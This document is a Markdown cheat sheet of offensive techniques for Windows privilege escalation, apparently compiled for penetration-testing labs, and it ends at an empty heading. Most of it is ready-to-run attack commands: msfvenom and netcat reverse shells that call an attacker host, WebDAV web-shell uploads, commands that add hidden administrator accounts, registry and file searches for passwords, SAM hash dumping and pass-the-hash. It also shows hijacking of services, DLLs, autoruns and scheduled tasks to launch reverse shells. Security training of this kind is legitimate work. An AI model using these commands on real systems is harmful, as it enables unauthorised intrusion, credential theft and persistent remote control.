# Windows Privilege Escalation

### Resources
- http://www.fuzzysecurity.com/tutorials/16.html
- Metasploit meterpreter privilege escalation guide https://www.offensive-security.com/metasploit-unleashed/privilege-escalation/

### Enumeration
- `net user "%username"`
- try the `getsystem` command in meterpreter, rarely works but worth a shot: `meterpreter > getsystem`

- Generating a quick report without file upload
```
@echo --------- BASIC WINDOWS RECON ---------  > report.txt
timeout 1
net config Workstation  >> report.txt
timeout 1
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" >> report.txt
timeout 1
hostname >> report.txt
timeout 1
net users >> report.txt
timeout 1
ipconfig /all >> report.txt
timeout 1
route print >> report.txt
timeout 1
arp -A >> report.txt
timeout 1
netstat -ano >> report.txt
timeout 1
netsh firewall show state >> report.txt
timeout 1
netsh firewall show config >> report.txt
timeout 1
schtasks /query /fo LIST /v >> report.txt
timeout 1
tasklist /SVC >> report.txt
timeout 1
net start >> report.txt
timeout 1
DRIVERQUERY >> report.txt
timeout 1
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated >> report.txt
timeout 1
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated >> report.txt
timeout 1
dir /s *pass* == *cred* == *vnc* == *.config* >> report.txt
timeout 1
findstr /si password *.xml *.ini *.txt >> report.txt
timeout 1
reg query HKLM /f password /t REG_SZ /s >> report.txt
timeout 1
reg query HKCU /f password /t REG_SZ /s >> report.txt
timeout 1
dir "C:\"
timeout 1
dir "C:\Program Files\" >> report.txt
timeout 1
dir "C:\Program Files (x86)\"
timeout 1
dir "C:\Users\"
timeout 1
dir "C:\Users\Public\"
timeout 1
echo REPORT COMPLETE!
```

- Exploiting Windows Server 2003 and IIS 6.0 WEBDAV :
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=1.2.3.4 LPORT=443 -f asp > aspshell.txt

 cadavar http://$ip
 dav:/> put aspshell.txt
 Uploading aspshell.txt to `/aspshell.txt':
 Progress: [=============================>] 100.0% of 38468 bytes succeeded.
 dav:/> copy aspshell.txt aspshell3.asp;.txt
 Copying `/aspshell3.txt' to `/aspshell3.asp%3b.txt':  succeeded.
 dav:/> exit

 msf > use exploit/multi/handler
 msf exploit(handler) > set payload windows/meterpreter/reverse_tcp
 msf exploit(handler) > set LHOST 1.2.3.4
 msf exploit(handler) > set LPORT 80
 msf exploit(handler) > set ExitOnSession false
 msf exploit(handler) > exploit -j

 curl http://$ip/aspshell3.asp;.txt

 [*] Started reverse TCP handler on 1.2.3.4:443
 [*] Starting the payload handler...
 [*] Sending stage (957487 bytes) to 1.2.3.5
 [*] Meterpreter session 1 opened (1.2.3.4:443 -> 1.2.3.5:1063) at 2017-09-25 13:10:55 -0700
 ```

- to compile the python exploits using `PyInstaller`
 ```bash
 pip install pyinstaller
 wget -O exploit.py http://www.exploit-db/download/31853
 python pyinstaller.py --onefile exploit.py
 ```

- Windows Server 2003 and IIS 6.0 privilege escalation using Impersonation |  
Links: https://www.exploit-db.com/exploits/6705/ | https://github.com/Re4son/Churrasco

  ```
  c:\Inetpub>churrasco
  churrasco
  /churrasco/-->Usage: Churrasco.exe [-d] "command to run"

  c:\Inetpub>churrasco -d "net user /add <username> <password>"
  c:\Inetpub>churrasco -d "net localgroup administrators <username> /add"
  c:\Inetpub>churrasco -d "NET LOCALGROUP "Remote Desktop Users" <username> /ADD"
  ```

- Compiling MS11-080
```
python pyinstaller.py --onefile ms11-080.py
ms11-080.exe -O XP
```

- Executing a powershell script
```
powershell -ExecutionPolicy ByPass -command "& { . C:\Users\Public\Invoke-MS16-032.ps1; Invoke-MS16-032 }"
```

- Powershell Privilege Escalation Tools https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc

- **Running a command as a different user in Windows**
  - Sysinternals psexec
    - Prerequisites : username, password, nc.exe
    ```
    C:\>psexec64 \\COMPUTERNAME -u Test -p test -h "c:\users\public\nc.exe -nc 192.168.1.10 4444 -e cmd.exe"
    PsExec v2.2 - Execute processes remotely
    Copyright (C) 2001-2016 Mark Russinovich
    Sysinternals - www.sysinternals.com
    ```

  - Runas.exe
    - Prequisites : username, password
    ```
    C:\>C:\Windows\System32\runas.exe /env /noprofile /user:Test "c:\users\public\nc.exe -nc 192.168.1.10 4444 -e cmd.exe"
    Enter the password for Test:
    Attempting to start nc.exe as user "COMPUTERNAME\Test" ...
    ```

  - Powershell script
    - Prequisites : powershell, username, password
    ```
    $username = '<username here>'
    $password = '<password here>'
    $securePassword = ConvertTo-SecureString $password -AsPlainText -Force
    $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
    Start-Process -FilePath C:\Users\Public\nc.exe -NoNewWindow -Credential $credential -ArgumentList ("-nc","192.168.1.10","4444","-e","cmd.exe") -WorkingDirectory C:\Users\Public
    ```
    Then run this script using powershell.exe: </br>
    `powershell -ExecutionPolicy ByPass -command "& { . C:\Users\public\PowerShellRunAs.ps1; }"`


- Windows Service Configuration Viewer - Checks for misconfigurations in services that can lead to privilege escalation.
```
icacls scsiaccess.exe
scsiaccess.exe  
NT AUTHORITY\SYSTEM:(I)(F)  
BUILTIN\Administrators:(I)(F)  
BUILTIN\Users:(I)(RX)  
APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)  
Everyone:(I)(F)
```

- Compile a custom add user command in windows using C
```
root@kali:~# cat useradd.c  
#include <stdlib.h> /* system, NULL, EXIT_FAILURE */  
int main ()  
{  
int i;  
i=system ("net localgroup administrators low /add");  
return 0;  
}
```
`i686-w64-mingw32-gcc -o scsiaccess.exe useradd.c`

- Group Policy Preferences (GPP)
Found in modern domain environments

  - map the Domain Controller SYSVOL share </br>
  `net use z:\\dc01\SYSVOL`

  - Find the GPP file: Groups.xml
  `dir /s Groups.xml`

  - Review the contents for passwords
  `type Groups.xml`

  - Decrypt using GPP Decrypt
  `gpp-decrypt riBZpPtHOGtVk+SdLOmJ6xiNgFH6Gp45BoP3I6AnPgZ1IfxtgI67qqZfgh78kBZB`

- Find and display the proof.txt or flag.txt
```
meterpreter > run post/windows/gather/win_privs
meterpreter > cd\ & dir /b /s flag.txt
meterpreter > type c:\path-to\flag.txt
````

----------------------------------------------------------------------------------------

# Part - 2

### User accounts

- User accounts are used to log into a Windows system.
- Collection of settings/preferences bound to a unique identity

### Service accounts

- Service accounts are used to run services on Windows
- These can't be used to sign into a Windows system
- SYSTEM account is a default service account which has the **highest privilege** of any local account in Windows
- Other local service accounts include: NETWORK SERVICE, LOCAL SERVICE

### Groups

- User accounts can belong to multiple groups and groups can have multiple users
- Groups allow for easier access control to resources
- Regular groups (Administrators, Users) have a set list of members
- Pseudo groups (Authenticated Users) have a dynamic list of members, which changes based on certain conditions

### ACLs & ACEs

- Permissions to control a certain resource in Windows are controlled by the access control list (ACL) for that resource
- Each ACL is made up of zero or more access control entries (ACEs)
- Each ACE defines the relationship between a principal(user, group) and a certain access right

### RDP is present/can be enabled

- If RDP is available or can be enabled we can add our low privileged user to the administrators group and then spawn an administrator command prompt via the GUI

### Admin -> SYSTEM

- To escalate from Administrator to SYSTEM privileges, PsExec tool from Windows Sysinternals can be used : https://docs.microsoft.com/en-us/sysinternals/downloads/psexec

### PowerUp and SharpUp

- Tools that hunt for specific privilege escalation misconfigurations
```
# start checking for common privilege escalation misconfigurations
PS> . .\PowerUp.ps1
PS> Invoke-AllChecks
```

### WinPEAS

```
# Before running the script we need to add a registry key and then reopen the command prompt
> reg add HKCU\Console /v VirtualTerminalLevel/t REG_DWORD /d 1

# running all checks while avoiding time-consuming searches
> .\winPEASany.exe quiet cmd fast

# running specific check categories
> .\winPEASany.exe quiet cmd systeminfo
```

### accesschk.exe

- accesschk.exe is a tool for checking user access control rights
- can be used to check if a user or group has access to files, directories, services and registry keys


### Kernel

- Core of the operating system
- Layer between application software and the actual computer hardware
- Kernel has complete control over the operating system, so exploiting a kernel vulnerability can result in execution as the SYSTEM user

### Privilege Escalation Steps for Windows 7

- Extract the output of the systeminfo command
```
> systeminfo > systeminfo.txt
```
- Run `wesng` to find potential exploits
```
python wesng.py systeminfo.txt -i 'Elevation of Privilege' --exploits-only | less
```
- Cross reference results with compiled exploits
- Download the compiled exploit to the Windows VM
- Start a listener on attacking machine and run the exploit providing it with the reverse shell executable which should run with SYSTEM privileges
```
> .\exploit.exe C:\PrivEsc\reverse.exe
```

### Services

- These are simply programs that run in the background, accepting input or performing regular tasks
- If services run with SYSTEM privileges are misconfigured, exploiting them may lead to command execution with SYSTEM privileges

### Service commands

```
# query the configuration of a service
> sc.exe qc <name>

# query the current status of a service
> sc.exe query <name>

# modify a configuration option of a service
> sc.exe config <name> <option>=<value>

# start/stop a service
> net start/stop <name>
```

### Service Miconfigurations

1. Insecure Service Properties
2. Unquoted Service Path
3. Weak registry permissions
4. Insecure service executables
5. DLL Hijacking

#### Insecure Service Properties
- Each service has an ACL which defines certain service-specific permissions
- Some permissions are innocuos(SERVICE_QUERY_CONFIG, SERVICE_QUERY_STATUS), some may be useful(SERVICE_STOP), some are dangerous(SERVICE_ALL_ACCESS, SERVICE_CHANGE_CONFIG)

- **Potential Rabbit Hole** : If you can change a service configuration but cannot stop/start the service, you may not be able to escalate privileges.

  - **Privilege Escalation Example**
  ```
  # 1. Run winPEAS to check for service misconfigurations
  > .\winpeas.exe quiet servicesinfo

  # 2. We can modify the "daclsvc" service
  # 3. We can confirm this with accesschk.exe
  > .\accesschk.exe /accepteula -uwcqv user daclsvc

  # 4. Check the current configuration of the service
  > sc qc daclsvc

  # 5. Check the current status of the service
  > sc query daclsvc

  # 6. Reconfigure the service to user our reverse shell executable
  > sc config daclsvc binpath="\"C:\PrivEsc\reverse.exe\""

  # 7. Start a listener on attacking machine and then start the service to trigger the exploit
  > net start daclsvc
  ```

#### Unquoted Service Path

**Example:**

- the command `C:\Program Files\Some Dir\SomeProgram.exe` can be interpreted in two ways
  1. the execution of SomeProgram.exe
  2. C:\Program being an executable with arguments Files\Some and Dir\SomeProgram.exe

- Windows checks each possibility in turn
- **If we can write to a location Windows checks before the actual executable, we can trick the service into executing it instead


- **Privilege Escalation Example**
```
# 1. Run winPEAS to check for service misconfigurations
> .\winpeas.exe quiet servicesinfo

# 2. unquotedsvc service has an unquoted path that also contains spaces:
C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe

# 3. confirm this using sc:
> sc qc unquotedsvc

# 4. use accesschk.exe to check for write permissions
> .\accesschk.exe /accepteula -uwdq C:\
> .\accesschk.exe /accepteula -uwdq "C:\Program Files\"
> .\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"

# 5. Copy the reverse shell executable and rename it appropriately
> copy C:\PrivEsc\reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"

# 6. start a listener on attacking machine and then start the service to trigger the exploit
> net start unquotedsvc
```

#### Weak Registry Permissions

- If the ACL is misconfigured, it may be possible to modify a service's configuration even if we cannot modify the service directly.

- **Privilege Escalation Example**
```
# 1. Run winPEAS to check for service misconfigurations
> .\winPEAS.exe quiet servicesinfo

# 2. the "regsvc" service has a weak registry entry. Can be confirmed using Powershell service has a weak registry entry. Can be confirmed using Powershell.
PS> Get-Acl HKLM:\System\CurrentcontrolSet\Services\regsvc | Format-List

# Or it can be confirmed using accesschk.exe
> .\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc

# 3. Overwrite the ImagePath Registry key to point to our reverse shell executable.
> reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f

# 4. Start a listener on attacking machine and then start the service to trigger the exploit:
> net start regsvc
```

#### Insecure Service Executables

- If the original service executable is modifiable by our user, it can be simply replaced by the reverse shell executable.

- **Privilege Escalation Example**
```
# 1. Run winPEAS to check for service misconfigurations
> .\winpeas.exe quiet servicesinfo

# 2. "filepermsvc" services has an executable which appears to be writable by everyone
> .\accesschk.exe /accepteula -quvw "C:\Progra Files\File Permissions Service\filepermservice.exe"

# 3. Create a backup of the original service executable
> copy "C:\Program Files\Files Permissions Serivce\filepermservice.exe" C:\Temp

# 4. Copy the reverse shell executable to overwrite the service executable
> copy /Y C:\PrivEsc\reverse.exe "C:\Program Files\File Permissions Service\filepermservice.exe"

# 5. Start a listener on the attacking machine and then start the service to trigger the shell
> net start filepermsvc
```

#### DLL Hijacking

- DLL (dynamic-link library) are libraries which are used by services to load some functionality.
- Whatever functionality the DLL provides will be executed with the same privileges as the service that loaded it.
- **if DLL is loaded with absolute path, it might be possible to escalate privileges if that DLL is write by our user**

- Even if a DLL is missing from the system we can escalate privileges if our user has access to a directory within the PATH that windows searches for DLLs in.

- **Privilege Escalation Example**
```
# 1. use winpeas to enumerate non-windows services
> .\winpeas.exe quiet servicesinfo

# 2. C:\Temp directory is writable and is in the PATH. Enumerating which of these services our user has stop and start access to
> .\accesschk.exe /accepteula -uvqc user dllsvc

# 3. the "dllsvc" service is vulnerable to DLL Hijacking. According to the winpeas output, the service runs the dllhijackservice.exe executable. Can be confirmed manually by:
> sc qc dllsvc

# 4. Run Procmon64.exe with administrator privileges. Press Ctrl+L to open the filter menu

# 5. Add a new filter on the Process Name matching dllhijackservice.exe

# 6. On the main screen, deselect the registry activity and network activity

# 8. Start the service
> net start dllsvc

# 8. "NAME NOT FOUND" errors appear in Procmon, associated with the hijackme.dll file

# 9. Windows tried to find the file in the C:\Temp directory, which as we found earlier is writable by our user

# 10. Generate a reverse shell DLL named hijackme.dll
# msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacking-ip> LPORT=53 -f dll -o hijackme.dll

# 11. Copy the DLL to the windows machine and into the C:\Temp directory. Start a listener on attacking machine and the stop/start the service to trigger the exploit
> net stop dllsvc
> net start dllsvc
```

#### AutoRuns

- AutoRuns are configured in the registry
- works if we have the permission to write an AutoRun executable and restart the system(or wait for it to be restarted)

- **Privilege Escalation Example**
```
# 1. use winpeas to check for writable AutoRun executable
> .\winpeas.exe quiet applicationsinfo
# OR we can manually enumerate the AutoRun executables
> reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

# 2. using accesschk.exe to verify the permissions on each one
> .\accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"

# 3. C:\Program Files\Autorun Program\program.exe is writable by everyone. Create a backup of the original
> copy "C:\Program Files\Autorun Program\program.exe" "C:\Temp"

# 4. copy our reverse shell executable to overwrite the Autorun executable
> copy /Y C:\PrivEsc\reverse.exe "C:\Program Files\Autorun Program\program.exe"

# 5. start a listener on attacking machine and then restart the windows machine to trigger the exploit
```

#### AlwaysInstallElevated

- MSI files are package files used to install applications
- These files run with the permissions of the user trying to install them
- Windows allows these installers to be run with elevated privileges
- Malicious MSI file can be generated and triggered to get a reverse shell

- **These two registry settings must be enabled for this to work**
- The "AlwaysInstallElevated" value must be set to 1 for both the local machine:
  1. HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
  and the current user:
  2. HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer

- **Privilege Escalation Example**
```
# 1. use winpeas to see if both the registry settings are set:
> .\winpeas.exe quiet windowscreds
# verifying manually
> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# 2. Create a new reverse shell with msfvenom in msi format
~ msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker-ip> LPORT=53 -f msi -o reverse.msi

# 3. Copy the reverse.msi across to the windows vm, start a listener on attacking machine and run the installer to trigger the exploit
> msiexec /quiet /qn /i C:\PrivEsc\reverse.msi
```


### Passwords

#### Searching the registry for passwords
```
> reg query HKLM /f password /t REG_SZ /s
> reg query HKCU /f password /t REG_SZ /s
```

- **Generating a shell using creds**
```
~ winexe -U 'admin%password123' //<victim-ip> cmd.exe
```

#### Looking for saved creds

- Windows has runas command which allows users to run commands with the privileges of other users
- This usually required the knowledge of other user's password
- Windows also allows other users to save their credentials to the system, and these saved credentials can be used to bypass the requirement.

- **Privilege Escalation Example**
```
# 1. Use winPEAS to check for saved credentials
> .\winpeas.exe quiet cmd windowscreds
# 2. verify the creds manually using the command
> cmdkey /list
# 3. if the saved creds aren't present run the following script to refresh the credential.
> C:\PrivEsc\savedcred.bat
# 4. we can use the saved credential to run any command as the admin user. Start the listener on attacking machine and run the reverse shell executable
> runas /savecred /user:admin C:\PrivEsc\reverse.exe
```

#### Configuration Files

- some administrators leave configuration files with passwords in them
- 'unattend.xml' is an example of that

**Searching for configuration files**
```
# recursively search for files in the current directory with "pass" in the name, or ending with ".config"
> dir /s \*pass\* == \*.config
# recursively search for files in the current directory that contain the word "password" and also end in either .xml, .ini or .txt
> findstr /si password *.xml *.ini *.txt
```

- **Privilege Escalation Example**
```
# 1. use winpeas to search for common files which may contain credentials
> .\winpeas.exe quiet cmd searchfast filesinfo
# 2. unattend.xml file was found
# 3. password for the admin user is found
# 4. use winexe on attacking machine to spawn a shell as admin user
```

#### SAM

- Windows stores password hashes in the security account manager (SAM).
- The hashes are encrypted with a key which can be found in a file named SYSTEM.
- if we have the permissions to read the SAM and SYSTEM files we can extract password hashes.

- SAM and SYSTEM files are located in
```
C:\Windows\System32\config
```
- Backups of these files may exist in
```
C:\Windows\System32\config\RegBack
```

- **use creddump7/pwdump.py against SAM and SYSTEM files to extract the hashes**
```
~ python2 creddump7/pwdump.py SYSTEM SAM
```

#### Passing the hash

- We can use a modified version of winexe, pth-winexe to spawn a command prompt using the admin user's hash

- **Privilege Escalation Example**
```
# 1. Extract the admin hash from SAM files

# 2. Use the hash with pth-winexe to spawn a command prompt:
~ pth-winexe -U 'admin%<hash>' //<victim-ip> cmd.exe

# 3. Use the hash with pth-winexe to spawn a SYSTEM level command prompt:
~ pth-winexe --system -U 'admin%<hash>' //<victim-ip> cmd.exe
```

### Scheduled Tasks

- These tasks usually run with privileges of the user who created them.
- **Administrators can configure the tasks to run as other users, including SYSTEM**

#### Commands
```
# List all scheduled tasks your user can see:
> schtasks /query /fo LIST /v

# In powershell:
PS> Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft"} | ft TaskName, TaskPath, State
```
- We have to rely on other clues, like a script or log file that indicated a scheduled task is being run.

- **Privilege Escalation Example**
```
# 1. In the C:\DevTools directory, there is a Powershell script called "CleanUp.ps1". View the script:
> type C:\DevTools\CleanUp.ps1

# 2. This script seems like it is running every minute as the SYSTEM user. We can check our privileges on this script using accesschk.exe:
> C:\PrivEsc\accesschk.exe /accepteula -quvw user C:\DevTools\CleanUp.ps1

# It appears that we have the ability to write this file

# 3. Make a backup of the script

# 4. Start a listener on the attacking machine

# 5. Append a call to our reverse shell executable at the end of the script
> echo C:\PrivEsc\reverse.exe >> C:\DevTools\CleanUp.ps1

# 6. Wait for the scheduled task to run to trigger the reverse shell
```

### Insecure GUI Apps

- On some older version of Windows users could be granted the permission to run certain GUI apps with administrator privileges
- Since the parent process is running with administrator privileges the command prompt opened from it will also run with administrator privileges

- **Privilege Escalation Example**
```
# 1. Open the AdminPaint shortcut

# 2. Open a command prompt and run:
> tasklist /V | findstr mspaint.exe

# 3. In paint, click File, then Open

# 4. In the navigation input replace the contents with:
file://C:/windows/system32/cmd.exe

# 5. Press enter. A command prompt should open with administrator privileges
```

### Startup appps

- The directory with apps that should start for all users on startup:
`C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp`

- If we can create files in this directory, we can use our reverse shell executable and escalate privileges when an admin logs in

- **the shortcut files (.lnk) must be used**
- script to create shortcut files
```
Set oWS = WScript.CreateObject("WScript.Shell")
sLinkFile = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\reverse.lnk"
Set oLink = oWS.CreateShortcut(sLinkFile)
oLink.TargetPath = "C:\PrivEsc\reverse.exe"
oLink.save
```

- **Privilege Escalation Example**
```
# 1. Use accesschk.exe to check permissions on the StartUp directory:
> .\accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"

# 2. BUILTIN\Users group has write access to this directory

# 3. Create a file CreateShortcut.vbs with the VBScript. Change the file paths if necessary.

# 4. Run the script using cscript:
> cscript CreateShortcut.vbs

# 5. Start a listener on the attacking machine
```

### Installed Applications

- **Commands**
```
# manually enumerate all running Programs
> tasklist /v

# use seatbelt to search for non standard processes:
> .\seatbelt.exe NonstandardProcesses

# winpeas also has this ability
> .\winpeas.exe quiet processinfo
```

- Once an interesting process is found, try to identify its version and search for a correspoding exploit.

### Hot Potato

- This is an attack that uses a spoofing attack along with an NTLM relay attack to gain SYSTEM privileges.
- The attack tricks windows into authenticating as SYSTEM user to a fake HTTP server using NTLM. The NTLM credentials then get relayed to SMB in order to gain command injection.
- This attack works on Windows 7, 8, early versions of Windows 10 and their server counterparts

- **Privilege Escalation Example**
```
# 1. Copy the potato.exe executable to the windows machine
# 2. Start a listener on the attacking machine
# 3. Run the exploit
> .\potato.exe -ip <attacking-ip> -cmd "C:\PrivEsc\reverse.exe" -enable_httpserver true -enable_defender true -enable_spoof true -enable_exhaust true

# 4. Wait for a Windows Defender update or trigger one manually
```

### Token Impersonation
